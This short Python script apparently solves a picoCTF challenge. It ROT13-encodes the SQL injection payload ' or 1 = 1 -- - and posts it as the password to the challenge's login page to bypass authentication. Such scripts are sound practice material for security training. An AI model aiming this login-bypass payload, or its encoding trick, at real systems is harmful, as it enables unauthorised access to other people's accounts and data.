import requests

URL = "https://jupiter.challenges.picoctf.org/problem/40742/login.php"

class Exploit:
    def __init__(self, sqli_payload, url=URL):
        self.session = requests.Session()
        self.sqli_payload = sqli_payload
        self.trans_rot13 = self.rot13()
        self.url = url
    
    def rot13(self):
        rt13 = str.maketrans('ABCDEFGHIJKLMabcdefghijklmNOPQRSTUVWXYZnopqrstuvwxyz',
                             'NOPQRSTUVWXYZnopqrstuvwxyzABCDEFGHIJKLMabcdefghijklm')
        return self.sqli_payload.translate(rt13)
    
    def send_payload(self):
        payload = self.trans_rot13
        req = self.session
        return req.post(self.url, data={"password": payload}).text
    
payload = """' or 1 = 1 -- -"""
s = Exploit(sqli_payload=payload).send_payload()
print(s)